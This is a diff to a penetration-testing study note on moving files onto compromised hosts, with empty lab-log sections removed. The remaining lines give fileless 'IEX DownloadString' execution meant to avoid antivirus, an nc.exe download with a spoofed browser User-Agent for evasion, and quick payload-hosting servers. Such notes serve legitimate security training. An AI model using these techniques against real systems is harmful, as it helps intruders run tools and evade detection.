@@ -42,9 +42,6 @@ Alternate ports, legit User-Agents, base64/`certutil -encode`, compress+encrypt 
 
 > `python3 -m http.server` on your box + `wget`/`certutil`/IWR on the target covers 90% of transfers. `IEX (...).DownloadString` is the fileless favorite — runs in memory, nothing hits disk for AV to scan.
 
-## My notes / lab output
-Filled in as I run these on lab targets.
-
 ## Full command reference (source notes)
 Complete transfer command set — nothing trimmed.
 
@@ -64,33 +61,3 @@ Complete transfer command set — nothing trimmed.
 | `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | IWR with a Chrome User-Agent (evasion) |
 
 Host a quick server to pull from: `python3 -m http.server 80` · `impacket-smbserver share .` · `php -S 0.0.0.0:80`.
-
-## 2. Setup
-- Attack box: (Pwnbox / Kali VM)
-- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)
-
-## 3. Commands I used
-Each block says which machine it ran on.
-
-```bash
-# [ATTACK BOX]
-
-```
-
-```bash
-# [TARGET]
-
-```
-
-## 4. Confirmed (what worked)
-- 
-
-## 5. Tried, didn't work (and why)
-- 
-
-## 6. Open questions / revisit
-- 
-
-## 7. Cheat sheet lines
-Copied into `cheatsheets/`:
-- 
